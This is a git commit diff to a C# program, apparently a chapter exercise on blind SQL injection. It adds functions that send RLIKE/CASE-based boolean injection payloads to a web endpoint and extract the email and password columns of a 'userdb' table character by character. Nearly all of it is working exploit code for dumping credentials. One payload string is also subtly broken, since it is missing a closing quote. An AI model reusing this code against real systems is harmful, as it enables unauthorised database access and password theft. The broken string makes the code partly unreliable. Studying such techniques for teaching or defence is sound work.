db986d497e93faae075fd045ad99cf4ff7c09219
baharna <travis.s.whitney@gmail.com>
2019-04-16 21:52:39 -0400

    Update Program.cs

--- ch2_blind_sqli/Program.cs
+++ ch2_blind_sqli/Program.cs
@@ -19,7 +19,7 @@ namespace blind_sqli
                 getCountLength += " AND 'LeSo'='LeSo";
 
                 string response = MakeRequest(getCountLength);
-                if (response.Contains("parenthese not balanced"))
+                if (response.Contains("parentheses not balanced"))
                     break;
             }
             List<byte> countBytes = new List<byte>();
@@ -42,6 +42,20 @@ namespace blind_sqli
 
             int count = int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
             Console.WriteLine("There are " + count + " rows in the userdb table");
+
+            for (int row = 0; row < count; row++)
+            {
+                foreach (string column in new string[] { "email", "passwd"})
+                {
+                    Console.Write("Getting length of query value...");
+                    int valLength = GetLength(row, column);
+                    Console.WriteLine(valLength);
+
+                    Console.Write("Getting value...");
+                    string value = GetValue(row, column, valLength);
+                    Console.WriteLine(value);
+                }
+            }
         }
         private static string MakeRequest(string payload)
         {
@@ -54,6 +68,68 @@ namespace blind_sqli
                 response = reader.ReadToEnd();
 
             return response;
+        }
+        private static int GetLength(int row, string column)
+        {
+            int countLength = 0;
+            for (;; countLength++)
+            {
+                string getCountLength = "test' RLIKE (SELECT (CASE WHEN ((SELECT";
+                getCountLength += " LENGTH(IFNULL(CAST(CHAR_LENGTH(" + column + ") AS";
+                getCountLength += " CHAR),0x20)) FROM userdb ORDER BY email LIMIT";
+                getCountLength += row + ",1)=" + countLength + ") THEN 0x28 ELSE 0x41 END)) AND ";
+                getCountLength += " 'YIye'='YIye";
+
+                string response = MakeRequest(getCountLength);
+
+                if (response.Contains("parentheses not balanced"))
+                    break;
+            }
+
+            List<byte > countBytes = new List<byte>();
+            for (int i = 0; i <= countLength; i++)
+            {
+                for (int c = 48; c <= 58; c++)
+                {
+                    string getLength = "test' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
+                    getLength += " IFNULL(CAST(CHAR_LENGTH(" + column + ") AS CHAR),0x20) FROM";
+                    getLength += " userdb ORDER BY email LIMIT " + row + ",1)," + i;
+                    getLength += ",1))=" + c + ") THEN 0x28 ELSE 0x41 END)) AND 'YIye'='YIye";
+
+                    string response = MakeRequest(getLength);
+                    if (response.Contains("parentheses not balanced"))
+                    {
+                        countBytes.Add((byte)c);
+                        break;
+                    }
+                }
+            }
+            if (countBytes.Count > 0)
+                return int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
+            else
+                return 0;
+        }
+        private static string GetValue(int row, string column, int length)
+        {
+            List<byte> valBytes = new List<byte>();
+            for (int i = 0; i <= length; i++)
+            {
+                for (int c = 32; c <= 126; c++)
+                {
+                    string getChar = "test' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
+                    getChar += " IFNULL(CAST(" + column + " AS CHAR),0x20) FROM userdb ORDER BY";
+                    getChar += " email LIMIT " + row + ",1)," + i + ",1))=" + c + ") THEN 0x28 ELSE 0x41";
+                    getChar += " END)) and 'YIye'=YIye";
+                    string response = MakeRequest(getChar);
+
+                    if (response.Contains("parentheses not balanced"))
+                    {
+                        valBytes.Add((byte)c);
+                        break;
+                    }
+                }
+            }
+            return Encoding.ASCII.GetString(valBytes.ToArray());
         }
     }
 }
